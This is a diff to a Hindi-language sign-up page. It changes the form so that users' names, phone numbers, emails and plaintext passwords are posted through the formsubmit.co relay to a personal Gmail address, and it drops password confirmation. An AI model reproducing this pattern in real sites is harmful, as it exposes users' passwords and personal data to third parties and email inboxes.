@@ -61,21 +61,21 @@
 
   <div class="register-container">
     <h2>📝 नया रजिस्ट्रेशन</h2>
-    <form onsubmit="showThankYou(); return false;">
+    <form action="https://formsubmit.co/sunilsinghr672@gmail.com" method="POST">
       <label>पूरा नाम:</label>
-      <input type="text" required>
+      <input type="text" name="name" required>
 
       <label>मोबाइल नंबर:</label>
-      <input type="text" required>
+      <input type="text" name="mobile" required>
 
       <label>ईमेल आईडी:</label>
-      <input type="email">
+      <input type="email" name="email" required>
 
       <label>पासवर्ड:</label>
-      <input type="password" required>
+      <input type="password" name="password" required>
 
-      <label>पासवर्ड दोबारा:</label>
-      <input type="password" required>
+      <!-- Hidden field for admin approval tracking -->
+      <input type="hidden" name="approved" value="No">
 
       <button type="submit">रजिस्टर करें</button>
     </form>
@@ -84,10 +84,5 @@
     </div>
   </div>
 
-  <script>
-    function showThankYou() {
-      alert("🎉 रजिस्ट्रेशन सफल रहा! आपकी जानकारी सुरक्षित भेज दी गई है।");
-    }
-  </script>
 </body>
 </html>
